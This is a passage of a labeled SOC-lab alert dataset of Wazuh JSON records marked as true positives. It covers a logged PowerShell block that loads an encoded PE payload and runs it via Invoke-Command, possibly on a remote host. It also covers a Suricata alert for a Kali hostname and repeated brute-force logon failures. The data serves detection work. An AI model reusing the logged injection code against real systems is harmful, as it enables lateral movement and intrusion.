mg2cDZ0Nnw2gDaINow2lDaYNqA2pDasNrA2vDbANsQ2yDbMNtA21DbYNtw24DbkNug27DbwNvQ2+Db8NgA3BDcINww3EDcUNxg3HDcgNyQ3KDcsNzA3NDc4Nzw3QDdEN0g3iDeMN5g3nDegN6Q3qDesN7A3tDe4N7w3wDfMN9g33DfgN+Q36DfsN/A39Df4N/w3ADgEOAg4DDgQOBQ4GDgcOCA4JDgoOCw4MDg0ODg4PDhAOEQ4SDhMOFA4VDhYOGA4ZDhoOGw4cDh0OHg4fDiAOIQ4iDiMOJA4lDiYOJw4oDikOKg4rDi0OMA4xDjIOMw40DjUONg43DjgOOQ46DjsOPA49Dj4OPw4ADkEOQg5DDkQORw5KDksOTA5NDk4OTw5QDlEOUg5TDlQOVQ5WDlcOWA5ZDloOWw5cDl0OXg5fDmAOYQ5kDmgOaQ5qDmsObA5tDm4Obw5wDnEOcg5zDnQOdQ52DngOeQ57DnwOfw5CDoMOhA6FDoYOhw6MDpIOmA6eDp8OpA6lDqoOqw6wDrIOsw62DrcOuA65DroOuw6BDsIOxQ7WDtcO2A7ZDtoO2w7cDt0O3w7ADwEPAg8DDwQPBQ8GDwcPCA8JDwoPCw8MDw0PDg8PDxAPEQ8TDxQPFQ8WDxcPJg8oDyoPLA8wDzEPMg8zDzQPNQ82DzcPOA85DzoPOw88Dz0PPg8/DwAPQQ9CD0MPRA9FD0YPRw9ID0kPSg9LD0wPTQ9OD08PUg9AAAA4AkA1AAAAFA1VDVYNVw1YDVkNWw1cDV0NXg1fDWANYQ1iDWMNZA1lDWYNZw1oDWkNag1rDWwNbQ1uDW8NcA1xDXINcw10DXUNdg13DXgNeQ16DXsNfA19DX4Nfw1ADYENgg2DDYQNhQ2GDYcNiA2JDYoNiw2MDY0Njg2PDZANkQ2SDZMNlA2VDZYNlw2YDZkNmg2bDZwNnQ2eDZ8NoA2hDaINow2kDaUNpg2nDagNqQ2qDasNrA2tDa4NvQ3+DdIOHA8dDx4PHw8RD1MPVA9ZD1oPQBgDQDAAAAAZDpoOnQ6eDqEOog6lDqYOqQ6qDq0Org6xDrIOtQ62DrkOug69Dr4OgQ7CDsUOxg7JDsoOzQ7ODtEO0g7VDtYO2Q7aDt0O3g7hDuIO5Q7mDukO6g7tDu4O8Q7yDvUO9g75DvoO/Q7+DsEPAg8KDxIPGQ8aDyEPIg8pDyoPMg86DwIPRQ9MD1QPXA9kD2YPZw9uD3UPdg9+D0YPjg+WD54Ppg+uD7YPvg+GD84P1g/eD+YP7g/2D/4PwBwDQAgAAAAGDA4MFgweDCYMLgw2DD0MPgwFDEYMQAAALANALgAAAAAMTAxQDFQMWAxcDGIMZQxmDGcMbgxvDH4MRg3KDcsNzA3NDc4Nzw3QDdEN0g3TDdYN1w3YDdkN2g3bDdwN3Q3+Df8N5Q5zDncOeQ58DkYOiA6VDpcOpA6mDoYOyA7VDtcO5A7mDvMO9Q7CDwQPEQ8TDyAPIg8yDzQPAQ9DD1APUg9fD2APYQ9iD2MPZA9mD1YPmA+lD6cPtA+2D4MPxQ/SD9QP4Q/jD/AP8g//D8AAADADQC4AAAABDA4MEAwdDB8MMgw0DAIMRAxRDFMMYAxiDG8McQx+DEAMjAy6DLwMkgzhDPAM/wzODR4NIA0tDS8NCw1QDVUNWg1cDWkNaw14DXoNRw2JDbINtA2BDcMN0A3SDd8N4Q3uDfANxg4VDiQOMw4ODl0Obg59DkwOmw6qDrkOhg7JDuYO9Q7EDxMPIg8xDz4PPw8BD04PXQ9sD3wPfw9HD4oPmg+pD7gPhw/WD+UP9A/AAAA0A0AhAEAAAwwSDCEMIgwkDC4MLwwxDDkMOgw8DAYMVgxlDGYMaAxyDEEMkAyfDLAMsQyzDIIM0QzgDO8M/gzNDSANIQ0jDTANNA06DT4NBA1IDU4NUg1YDVwNYg1mDWwNcA12DXoNQA2EDYoNjg2YDZ4Nnw2gDaINqA2sDbYNvA29Db4NgA3GDcoN0A3UDdoN3g3kDegN7g3yDfgN/A3CDgYODA4QDhYOGg4gDiQOKg4uDjQOOA4+DgIOSA5MDlIOVg5cDmAOZg5qDnAOdA56Dn4ORA6IDo4Okg6YDpwOog6mDqwOsA62DroOgA7EDsoOzg7UDtUO1g7XDtgO3g7fDuAO4Q7iDugO6Q7qDusO7A7yDvMO9A71DvYO/A79Dv4O/w7ADwYPBw8IDwkPCg8QDxEPEg8TDxQPGA8aDx4PIg8kDygPLA8uDzIPPA8GD0wPUA9WD1cPWA9ZD1oPWw9gD2EPYg9jD2QPZQ9mD2cPag9sD3APdA92D3oPfg9AD4QPgAAAOANAFACAACQMJQwmDCcMKAwuDC8MMAwxDDIMOAw5DDoMOww8DAIMQwxEDEUMRgxMDE0MTgxPDFAMVgxXDFgMWQxaDGAMYQxiDGMMZAxqDGsMbAxtDG4MdAx1DHYMdwx4DH4MfwxADIEMggyIDIkMigyLDIwMkgyTDJQMlQyWDJwMnQyeDJ8MoAymDKcMqAypDKoMsAyxDLIMswy0DLoMuwy8DL0Mvgy/DIQMxQzGDMcMyAzJDMoMywzQDNEM0gzTDNQM1QzaDNsM3AzdDN4M3wzgDOEM5AzlDOcM6gztDO4M8AzxDPMM9Az2DPcM+Qz6DPwM/Qz/DMANAg0DDQUNCA0LDQwNDg0PDRENEg0UDRcNGA0aDRsNHQ0eDSANIQ0jDSQNJg0nDSkNKg0sDS0NLw0wDTINMw01DTgNOQ07DTwNPg0/DQENQg1EDUUNRw1IDUoNSw1NDU4NUA1RDVMNVA1WDVcNWQ1aDVwNXQ1fDWANYg1jDWUNZg1oDWsNbg1vDXENcg10DXUNdw14DXoNew19DX4NQA2BDYMNhA2GDYcNiQ2KDYwNjQ2PDZANkg2TDZUNlg2YDZkNmw2cDZ4NoQ2iDaQNpQ2nDaoNrQ2wDbMNtg25DbwNvQ2/DYANwg3DDcUNyA3JDcsNzg3RDdIN2A3cDeIN5g3sDfAN8g30DfYN+A38Df4Nxg4HDggOCQ4KDgsOEA4RDhIOEw4UDhUOFg4XDhgOGQ4aDhsOHA4dDh4OHw4gDiEOIg4jDiUOJg4nDigOKQ4qDisOLA4tDgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=='\n\n\tif ($ComputerName -eq $null -or $ComputerName -imatch \"^\\s*$\")\n\t{\n\t\tInvoke-Command -ScriptBlock $RemoteScriptBlock -ArgumentList @($PEBytes64, $PEBytes32, \"Void\", 0, \"\", $ExeArgs)\n\t}\n\telse\n\t{\n\t\tInvoke-Command -ScriptBlock $RemoteScriptBlock -ArgumentList @($PEBytes64, $PEBytes32, \"Void\", 0, \"\", $ExeArgs) -ComputerName $ComputerName\n\t}\n}\n\nMain\n}\n\r\n\r\nScriptBlock ID: 0d7f0a6a-eb19-42f9-8237-fd89ea6d3773\r\nPath: \"", "version": "1", "systemTime": "2025-07-06T14:02:37.0480451Z", "eventRecordID": "34582", "threadID": "5652", "computer": "Win11Client.soclab.internal", "task": "2", "processID": "1972", "severityValue": "WARNING", "providerName": "Microsoft-Windows-PowerShell"}}}, "rule": {"firedtimes": 1, "mail": true, "description": "Powershell script used \"Invoke-command\" cmdlet to execute code on remote computer", "groups": ["windows", " powershell"], "mitre": {"technique": ["PowerShell", "Windows Remote Management"], "id": ["T1059.001", "T1021.006"], "tactic": ["Execution", "Lateral Movement"]}, "id": "91823"}, "location": "EventChannel", "decoder": {"name": "windows_eventchannel"}, "id": "1751810586.31010893", "timestamp": "2025-07-06T14:03:06.016+0000"}, "fields": {"timestamp": ["2025-07-06T14:03:06.016Z"]}, "sort": [1751810586016]}}
{"id": "yJyD5pcBllEhiOW6yWa1", "description": "Suricata: Alert - ET INFO Possible Kali Linux hostname in DHCP Request Packet", "label": "TP", "rule_level": 3, "rule_priority": "Low", "alert": {"_index": "wazuh-alerts-4.x-2025.07.07", "_id": "yJyD5pcBllEhiOW6yWa1", "_score": null, "_source": {"input": {"type": "log"}, "agent": {"ip": "10.0.2.6", "name": "Suricata", "id": "001"}, "manager": {"name": "wazuh-server"}, "data": {"app_proto": "dhcp", "in_iface": "enp0s3", "src_ip": "10.0.2.8", "src_port": "68", "event_type": "alert", "alert": {"severity": "1", "signature_id": "2022973", "rev": "1", "metadata": {"performance_impact": ["Low"], "attack_target": ["Client_Endpoint"], "updated_at": ["2019_07_26"], "confidence": ["Medium"], "reviewed_at": ["2024_04_19"], "created_at": ["2016_07_18"], "signature_severity": ["Informational"], "deployment": ["Perimeter"]}, "gid": "1", "signature": "ET INFO Possible Kali Linux hostname in DHCP Request Packet", "action": "allowed", "category": "Potential Corporate Privacy Violation"}, "flow_id": "1730958389108054.000000", "dest_ip": "10.0.2.3", "proto": "UDP", "dest_port": "67", "pkt_src": "wire/pcap", "flow": {"src_ip": "10.0.2.8", "src_port": "68", "pkts_toserver": "2", "dest_ip": "10.0.2.3", "start": "2025-07-07T20:06:22.992844+0000", "bytes_toclient": "590", "bytes_toserver": "648", "pkts_toclient": "1", "dest_port": "67"}, "timestamp": "2025-07-07T20:11:22.838518+0000", "direction": "to_server"}, "rule": {"firedtimes": 7, "mail": false, "description": "Suricata: Alert - ET INFO Possible Kali Linux hostname in DHCP Request Packet", "groups": ["ids", "suricata"], "id": "86601"}, "location": "/var/log/suricata/eve.json", "decoder": {"name": "json"}, "id": "1751919082.4571264", "timestamp": "2025-07-07T20:11:22.921+0000"}, "fields": {"timestamp": ["2025-07-07T20:11:22.921Z"], "data.timestamp": ["2025-07-07T20:11:22.838Z"]}, "sort": [1751919082921]}}
{"id": "KZyS5pcBllEhiOW67Gzv", "description": "Multiple Windows Logon Failures", "label": "TP", "rule_level": 10, "rule_priority": "Medium", "alert": {"_index": "wazuh-alerts-4.x-2025.07.07", "_id": "KZyS5pcBllEhiOW67Gzv", "_score": null, "_source": {"input": {"type": "log"}, "agent": {"ip": "10.0.2.14", "name": "Win11Client", "id": "003"}, "previous_output": "{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-Security-Auditing\",\"providerGuid\":\"{54849625-5478-4994-a5ba-3e3b0328c30d}\",\"eventID\":\"4625\",\"version\":\"0\",\"level\":\"0\",\"task\":\"12544\",\"opcode\":\"0\",\"keywords\":\"0x8010000000000000\",\"systemTime\":\"2025-07-07T20:27:54.8861122Z\",\"eventRecordID\":\"1764515\",\"processID\":\"924\",\"threadID\":\"996\",\"channel\":\"Security\",\"computer\":\"Win11Client.soclab.internal\",\"severityValue\":\"AUDIT_FAILURE\",\"message\":\"\\\"An account failed to log on.\\r\\n\\r\\nSubject:\\r\\n\\tSecurity ID:\\t\\tS-1-0-0\\r\\n\\tAccount Name:\\t\\t-\\r\\n\\tAccount Domain:\\t\\t-\\r\\n\\tLogon ID:\\t\\t0x0\\r\\n\\r\\nLogon Type:\\t\\t\\t3\\r\\n\\r\\nAccount For Which Logon Failed:\\r\\n\\tSecurity ID:\\t\\tS-1-0-0\\r\\n\\tAccount Name:\\t\\ttop-usernames-shortlist.txt\\r\\n\\tAccount Domain:\\t\\t-\\r\\n\\r\\nFailure Information:\\r\\n\\tFailure Reason:\\t\\tUnknown user name or bad password.\\r\\n\\tStatus:\\t\\t\\t0xC000006D\\r\\n\\tSub Status:\\t\\t0xC0000064\\r\\n\\r\\nProcess Information:\\r\\n\\tCaller Process ID:\\t0x0\\r\\n\\tCaller Process Name:\\t-\\r\\n\\r\\nNetwork Information:\\r\\n\\tWorkstation Name:\\tkali\\r\\n\\tSource Network Address:\\t10.0.2.8\\r\\n\\tSource Port:\\t\\t0\\r\\n\\r\\nDetailed Authentication Information:\\r\\n\\tLogon Process:\\t\\tNtLmSsp \\r\\n\\tAuthentication Package:\\tNTLM\\r\\n\\tTransited Services:\\t-\\r\\n\\tPackage Name (NTLM only):\\t-\\r\\n\\tKey Length:\\t\\t0\\r\\n\\r\\nThis event is generated when a logon request fails. It is generated on the computer where access was attempted.\\r\\n\\r\\nThe Subject fields indicate the account on the local system which requested the logon. This is most commonly a service such as the Server service, or a local process such as Winlogon.exe or Services.exe.\\r\\n\\r\\nThe Logon Type field indicates the kind of logon that was requested. The most common types are 2 (interactive) and 3 (network).\\r\\n\\r\\nThe Process Information fields indicate which account and process on the system requested the logon.\\r\\n\\r\\nThe Network Information fields indicate where a remote logon request originated. Workstation name is not always available and may be left blank in some cases.\\r\\n\\r\\nThe authentication information fields provide detailed information about this specific logon request.\\r\\n\\t- Transited services indicate which intermediate services have participated in this logon request.\\r\\n\\t- Package name indicates which sub-protocol was used among the NTLM protocols.\\r\\n\\t- Key length indicates the length of the generated session key. This will be 0 if no session key was requested.\\\"\"},\"eventdata\":{\"subjectUserSid\":\"S-1-0-0\",\"subjectLogonId\":\"0x0\",\"targetUserSid\":\"S-1-0-0\",\"targetUserName\":\"top-usernames-shortlist.txt\",\"status\":\"0xc000006d\",\"failureReason\":\"%%2313\",\"subStatus\":\"0xc0000064\",\"logonType\":\"3\",\"logonProcessName\":\"NtLmSsp\",\"authenticationPackageName\":\"NTLM\",\"workstationName\":\"kali\",\"keyLength\":\"0\",\"processId\":\"0x0\",\"ipAddress\":\"10.0.2.8\",\"ipPort\":\"0\"}}}\n{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-Security-Auditing\",\"providerGuid\":\"{54849625-5478-4994-a5ba-3e3b0328c30d}\",\"eventID\":\"4625\",\"version\":\"0\",\"level\":\"0\",\"task\":\"12544\",\"opcode\":\"0\",\"keywords\":\"0x8010000000000000\",\"systemTime\":\"2025-07-07T20:27:54.6063776Z\",\"eventRecordID\":\"1764514\",\"processID\":\"924\",\"threadID\":\"996\",\"channel\":\"Security\",\"computer\":\"Win11Client.soclab.internal\",\"severityValue\":\"AUDIT_FAILURE\",\"message\":\"\\\"An account failed to log on.\\r\\n\\r\\nSubject:\\r\\n\\tSecurity ID:\\t\\tS-1-0-0\\r\\n\\tAccount Name:\\t\\t-\\r\\n\\tAccount Domain:\\t\\t-\\r\\n\\tLogon ID:\\t\\t0x0\\r\\n\\r\\nLogon Type:\\t\\t\\t3\\r\\n\\r\\nAccount For Which Logon Failed:\\r\\n\\tSecurity ID:\\t\\tS-1-0-0\\r\\n\\tAccount Name:\\t\\ttop-usernames-shortlist.txt\\r\\n\\tAccount Domain:\\t\\t-\\r\\n\\r\\nFailure Information:\\r\\n\\tFailure Reason:\\t\\tUnknown user name or bad password.\\r\\n\\tStatus:\\t\\t\\t0xC000006D\\r\\n\\tSub Status:\\t\\t0xC0000064\\r\\n\\r\\nProcess Information:\\r\\n\\tCaller Process ID:\\t0x0\\r\\n\\tCaller Process Name:\\t-\\r\\n\\r\\nNetwork Information:\\r\\n\\tWorkstation Name:\\tkali\\r\\n\\tSource Network Address:\\t10.0.2.8\\r\\n\\tSource Port:\\t\\t0\\r\\n\\r\\nDetailed Authentication Information:\\r\\n\\tLogon Process:\\t\\tNtLmSsp \\r\\n\\tAuthentication Package:\\tNTLM\\r\\n\\tTransited Services:\\t-\\r\\n\\tPackage Name (NTLM only):\\t-\\r\\n\\tKey Length:\\t\\t0\\r\\n\\r\\nThis event is generated when a logon request fails. It is generated on the computer where access was attempted.\\r\\n\\r\\nThe Subject fields indicate the account on the local system which requested the logon. This is most commonly a service such as the Server service, or a local process such as Winlogon.exe or Services.exe.\\r\\n\\r\\nThe Logon Type field indicates the kind of logon that was requested. The most common types are 2 (interactive) and 3 (network).\\r\\n\\r\\nThe Process Information fields indicate which account and process on the system requested the logon.\\r\\n\\r\\nThe Network Information fields indicate where a remote logon request originated. Workstation name is not always available and may be left blank in some cases.\\r\\n\\r\\nThe authentication information fields provide detailed information about this specific logon request.\\r\\n\\t- Transited services indicate which intermediate services have participated in this logon request.\\r\\n\\t- Package name indicates which sub-protocol was used among the NTLM protocols.\\r\\n\\t- Key length indicates the length of the generated session key. This will be 0 if no session key was requested.\\\"\"},\"eventdata\":{\"subjectUserSid\":\"S-1-0-0\",\"subjectLogonId\":\"0x0\",\"targetUserSid\":\"S-1-0-0\",\"targetUserName\":\"top-usernames-shortlist.txt\",\"status\":\"0xc000006d\",\"failureReason\":\"%%2313\",\"subStatus\":\"0xc0000064\",\"logonType\":\"3\",\"logonProcessName\":\"NtLmSsp\",\"authenticationPackageName\":\"NTLM\",\"workstationName\":\"kali\",\"keyLength\":\"0\",\"processId\":\"0x0\",\"ipAddress\":\"10.0.2.8\",\"ipPort\":\"0\"}}}\n{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-Security-Auditing\",\"providerGuid\":\"{54849625-5478-4994-a5ba-3e3b0328c30d}\",\"eventID\":\"4625\",\"version\":\"0\",\"level\":\"0\",\"task\":\"12544\",\"opcode\":\"0\",\"keywords\":\"0x8010000000000000\",\"systemTime\":\"2025-07-07T20:27:54.3616734Z\",\"eventRecordID\":\"1764513\",\"processID\":\"924\",\"threadID\":\"996\",\"channel\":\"Security\",\"computer\":\"Win11Client.soclab.internal\",\"severityValue\":\"AUDIT_FAILURE\",\"message\":\"\\\"An account failed to log on.\\r\\n\\r\\nSubject:\\r\\n\\tSecurity ID:\\t\\tS-1-0-0\\r\\n\\tAccount Name:\\t\\t-\\r\\n\\tAccount Domain:\\t\\t-\\r\\n\\tLogon ID:\\t\\t0x0\\r\\n\\r\\nLogon Type:\\t\\t\\t3\\r\\n\\r\\nAccount For Which Logon Failed:\\r\\n\\tSecurity ID:\\t\\tS-1-0-0\\r\\n\\tAccount Name:\\t\\ttop-usernames-shortlist.txt\\r\\n\\tAccount Domain:\\t\\t-\\r\\n\\r\\nFailure Information:\\r\\n\\tFailure Reason:\\t\\tUnknown user name or bad password.\\r\\n\\tStatus:\\t\\t\\t0xC000006D\\r\\n\\tSub Status:\\t\\t0xC0000064\\r\\n\\r\\nProcess Information:\\r\\n\\tCaller Process ID:\\t0x0\\r\\n\\tCaller Process Name:\\t-\\r\\n\\r\\nNetwork Information:\\r\\n\\tWorkstation Name:\\tkali\\r\\n\\tSource Network Address:\\t10.0.2.8\\r\\n\\tSource Port:\\t\\t0\\r\\n\\r\\nDetailed Authentication Information:\\r\\n\\tLogon Process:\\t\\tNtLmSsp \\r\\n\\tAuthentication Package:\\tNTLM\\r\\n\\tTransited Services:\\t-\\r\\n\\tPackage Name (NTLM only):\\t-\\r\\n\\tKey Length:\\t\\t0\\r\\n\\r\\nThis event is generated when a logon request fails. It is generated on the computer where access was attempted.\\r\\n\\r\\nThe Subject fields indicate the account on the local system which requested the logon. This is most commonly a service such as the Server service, or a local process such as Winlogon.exe or Services.exe.\\r\\n\\r\\nThe Logon Type field indicates the kind of logon that was requested. The most common types are 2 (interactive) and 3 (network).\\r\\n\\r\\nThe Process Information fields indicate which account and process on the system requested the logon.\\r\\n\\r\\nThe Network Information fields indicate where a remote logon request originated. Workstation name is not always available and may be left blank in some cases.\\r\\n\\r\\nThe authentication information fields provide detailed information about this specific logon request.\\r\\n\\t- Transited services indicate which intermediate services have participated in this logon request.\\r\\n\\t- Package name indicates which sub-protocol was used among the NTLM protocols.\\r\\n\\t- Key length indicates the length of the generated session key. This will be 0 if no session key was requested.\\\"\"},\"eventdata\":{\"subjectUserSid\":\"S-1-0-0\",\"subjectLogonId\":\"0x0\",\"targetUserSid\":\"S-1-0-0\",\"targetUserName\":\"top-usernames-shortlist.txt\",\"status\":\"0xc000006d\",\"failureReason\":\"%%2313\",\"subStatus\":\"0xc0000064\",\"logonType\":\"3\",\"logonProcessName\":\"NtLmSsp\",\"authenticationPackageName\":\"NTLM\",\"workstationName\":\"kali\",\"keyLength\":\"0\",\"processId\":\"0x0\",\"ipAddress\":\"10.0.2.8\",\"ipPort\":\"0\"}}}\n{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-Security-Auditing\",\"providerGuid\":\"{54849625-5478-4994-a5ba-3e3b0328c30d}\",\"eventID\":\"4625\",\"version\":\"0\",\"level\":\"0\",\"task\":\"12544\",\"opcode\":\"0\",\"keywords\":\"0x8010000000000000\",\"systemTime\":\"2025-07-07T20:27:54.1467146Z\",\"eventRecordID\":\"1764512\",\"processID\":\"924\",\"threadID\":\"996\",\"channel\":\"Security\",\"computer\":\"Win11Client.soclab.internal\",\"severityValue\":\"AUDIT_FAILURE\",\"message\":\"\\\"An account failed to log on.\\r\\n\\r\\nSubject:\\r\\n\\tSecurity ID:\\t\\tS-1-0-0\\r\\n\\tAccount Name:\\t\\t-\\r\\n\\tAccount Domain:\\t\\t-\\r\\n\\tLogon ID:\\t\\t0x0\\r\\n\\r\\nLogon Type:\\t\\t\\t3\\r\\n\\r\\nAccount For Which Logon Failed:\\r\\n\\tSecurity ID:\\t\\tS-1-0-0\\r\\n\\tAccount Name:\\t\\ttop-usernames-shortlist.txt\\r\\n\\tAccount Domain:\\t\\t-\\r\\n\\r\\nFailure Information:\\r\\n\\tFailure Reason:\\t\\tUnknown user name or bad password.\\r\\n\\tStatus:\\t\\t\\t0xC000006D\\r\\n\\tSub Status:\\t\\t0xC0000064\\r\\n\\r\\nProcess Information:\\r\\n\\tCaller Process ID:\\t0x0\\r\\n\\tCaller Process Name:\\t-\\r\\n\\r\\nNetwork Information:\\r\\n\\tWorkstation Name:\\tkali\\r\\n\\tSource Network Address:\\t10.0.2.8\\r\\n\\tSource Port:\\t\\t0\\r\\n\\r\\nDetailed Authentication Information:\\r\\n\\tLogon Process:\\t\\tNtLmSsp \\r\\n\\tAuthentication Package:\\tNTLM\\r\\n\\tTransited Services:\\t-\\r\\n\\tPackage Name (NTLM only):\\t-\\r\\n\\tKey Length:\\t\\t0\\r\\n\\r\\nThis event is generated when a logon request fails. It is generated on the computer where access was attempted.\\r\\n\\r\\nThe Subject fields indicate the account on the local system which requested the logon. This is most commonly a service such as the Server service, or a local process such as Winlogon.exe or Services.exe.\\r\\n\\r\\nThe Logon Type field indicates the kind of logon that was requested. The most common types are 2 (interactive) and 3 (network).\\r\\n\\r\\nThe Process Information fields indicate which account and process on the system requested the logon.\\r\\n\\r\\nThe Network Information fields indicate where a remote logon request originated. Workstation name is not always available and may be left blank in some cases.\\r\\n\\r\\nThe authentication information fields provide detailed information about this specific logon request.\\r\\n\\t- Transited services indicate which intermediate services have participated in this logon request.\\r\\n\\t- Package name indicates which sub-protocol was used among the NTLM protocols.\\r\\n\\t- Key length indicates the length of the generated session key. This will be 0 if no session key was requested.\\\"\"},\"eventdata\":{\"subjectUserSid\":\"S-1-0-0\",\"subjectLogonId\":\"0x0\",\"targetUserSid\":\"S-1-0-0\",\"targetUserName\":\"top-usernames-shortlist.txt\",\"status\":\"0xc000006d\",\"failureReason\":\"%%2313\",\"subStatus\":\"0xc0000064\",\"logonType\":\"3\",\"logonProcessName\":\"NtLmSsp\",\"authenticationPackageName\":\"NTLM\",\"workstationName\":\"kali\",\"keyLength\":\"0\",\"processId\":\"0x0\",\"ipAddress\":\"10.0.2.8\",\"ipPort\":\"0\"}}}\n{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-Security-Auditing\",\"providerGuid\":\"{54849625-5478-4994-a5ba-3e3b0328c30d}\",\"eventID\":\"4625\",\"version\":\"0\",\"level\":\"0\",\"task\":\"12544\",\"opcode\":\"0\",\"keywords\":\"0x8010000000000000\",\"systemTime\":\"2025-07-07T20:27:53.8503647Z\",\"eventRecordID\":\"1764511\",\"processID\":\"924\",\"threadID\":\"996\",\"channel\":\"Security\",\"computer\":\"Win11Client.soclab.internal\",\"severityValue\":\"AUDIT_FAILURE\",\"message\":\"\\\"An account failed to log on.\\r\\n\\r\\nSubject:\\r\\n\\tSecurity ID:\\t\\tS-1-0-0\\r\\n\\tAccount Name:\\t\\t-\\r\\n\\tAccount Domain:\\t\\t-\\r\\n\\tLogon ID:\\t\\t0x0\\r\\n\\r\\nLogon Type:\\t\\t\\t3\\r\\n\\r\\nAccount For Which Logon Failed:\\r\\n\\tSecurity ID:\\t\\tS-1-0-0\\r\\n\\tAccount Name:\\t\\ttop-usernames-shortlist.txt\\r\\n\\tAccount Domain:\\t\\t-\\r\\n\\r\\nFailure Information:\\r\\n\\tFailure Reason:\\t\\tUnknown user name or bad password.\\r\\n\\tStatus:\\t\\t\\t0xC000006D\\r\\n\\tSub Status:\\t\\t0xC0000064\\r\\n\\r\\nProcess Information:\\r\\n\\tCaller Process ID:\\t0x0\\r\\n\\tCaller Process Name:\\t-\\r\\n\\r\\nNetwork Information:\\r\\n\\tWorkstation Name:\\tkali\\r\\n\\tSource Network Address:\\t10.0.2.8\\r\\n\\tSource Port:\\t\\t0\\r\\n\\r\\nDetailed Authentication Information:\\r\\n\\tLogon Process:\\t\\tNtLmSsp \\r\\n\\tAuthentication Package:\\tNTLM\\r\\n\\tTransited Services:\\t-\\r\\n\\tPackage Name (NTLM only):\\t-\\r\\n\\tKey Length:\\t\\t0\\r\\n\\r\\nThis event is generated when a logon request fails. It is generated on the computer where access was attempted.\\r\\n\\r\\nThe Subject fields indicate the account on the local system which requested the logon. This is most commonly a service such as the Server service, or a local process such as Winlogon.exe or Services.exe.\\r\\n\\r\\nThe Logon Type field indicates the kind of logon that was requested. The most common types are 2 (interactive) and 3 (network).\\r\\n\\r\\nThe Process Information fields indicate which account and process on the system requested the logon.\\r\\n\\r\\nThe Network Information fields indicate where a remote logon request originated. Workstation name is not always available and may be left blank in some cases.\\r\\n\\r\\nThe authentication information fields provide detailed information about this specific logon request.\\r\\n\\t- Transited services indicate which intermediate services have participated in this logon request.\\r\\n\\t- Package name indicates which sub-protocol was used among the NTLM protocols.\\r\\n\\t- Key length indicates the length of the generated session key. This will be 0 if no session key was requested.\\\"\"},\"eventdata\":{\"subjectUserSid\":\"S-1-0-0\",\"subjectLogonId\":\"0x0\",\"targetUserSid\":\"S-1-0-0\",\"targetUserName\":\"top-usernames-shortlist.txt\",\"status\":\"0xc000006d\",\"failureReason\":\"%%2313\",\"subStatus\":\"0xc0000064\",\"logonType\":\"3\",\"logonProcessName\":\"NtLmSsp\",\"authenticationPackageName\":\"NTLM\",\"workstationName\":\"kali\",\"keyLength\":\"0\",\"processId\":\"0x0\",\"ipAddress\":\"10.0.2.8\",\"ipPort\":\"0\"}}}\n{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-Security-Auditing\",\"providerGuid\":\"{54849625-5478-4994-a5ba-3e3b0328c30d}\",\"eventID\":\"4625\",\"version\":\"0\",\"level\":\"0\",\"task\":\"12544\",\"opcode\":\"0\",\"keywords\":\"0x8010000000000000\",\"systemTime\":\"2025-07-07T20:27:53.5687842Z\",\"eventRecordID\":\"1764510\",\"processID\":\"924\",\"threadID\":\"996\",\"channel\":\"Security\",\"computer\":\"Win11Client.soclab.internal\",\"severityValue\":\"AUDIT_FAILURE\",\"message\":\"\\\"An account failed to log on.\\r\\n\\r\\nSubject:\\r\\n\\tSecurity ID:\\t\\tS-1-0-0\\r\\n\\tAccount Name:\\t\\t-\\r\\n\\tAccount Domain:\\t\\t-\\r\\n\\tLogon ID:\\t\\t0x0\\r\\n\\r\\nLogon Type:\\t\\t\\t3\\r\\n\\r\\nAccount For Which Logon Failed:\\r\\n\\tSecurity ID:\\t\\tS-1-0-0\\r\\n\\tAccount Name:\\t\\ttop-usernames-shortlist.txt\\r\\n\\tAccount Domain:\\t\\t-\\r\\n\\r\\nFailure Information:\\r\\n\\tFailure Reason:\\t\\tUnknown user name or bad password.\\r\\n\\tStatus:\\t\\t\\t0xC000006D\\r\\n\\tSub Status:\\t\\t0xC0000064\\r\\n\\r\\nProcess Information:\\r\\n\\tCaller Process ID:\\t0x0\\r\\n\\tCaller Process Name:\\t-\\r\\n\\r\\nNetwork Information:\\r\\n\\tWorkstation Name:\\tkali\\r\\n\\tSource Network Address:\\t10.0.2.8\\r\\n\\tSource Port:\\t\\t0\\r\\n\\r\\nDetailed Authentication Information:\\r\\n\\tLogon Process:\\t\\tNtLmSsp \\r\\n\\tAuthentication Package:\\tNTLM\\r\\n\\tTransited Services:\\t-\\r\\n\\tPackage Name (NTLM only):\\t-\\r\\n\\tKey Length:\\t\\t0\\r\\n\\r\\nThis event is generated when a logon request fails. It is generated on the computer where access was attempted.\\r\\n\\r\\nThe Subject fields indicate the account on the local system which requested the logon. This is most commonly a service such as the Server service, or a local process such as Winlogon.exe or Services.exe.\\r\\n\\r\\nThe Logon Type field indicates the kind of logon that was requested. The most common types are 2 (interactive) and 3 (network).\\r\\n\\r\\nThe Process Information fields indicate which account and process on the system requested the logon.\\r\\n\\r\\nThe Network Information fields indicate where a remote logon request originated. Workstation name is not always available and may be left blank in some cases.\\r\\n\\r\\nThe authentication information fields provide detailed information about this specific logon request.\\r\\n\\t- Transited services indicate which intermediate services have participated in this logon request.\\r\\n\\t- Package name indicates which sub-protocol was used among the NTLM protocols.\\r\\n\\t- Key length indicates the length of the generated session key. This will be 0 if no session key was 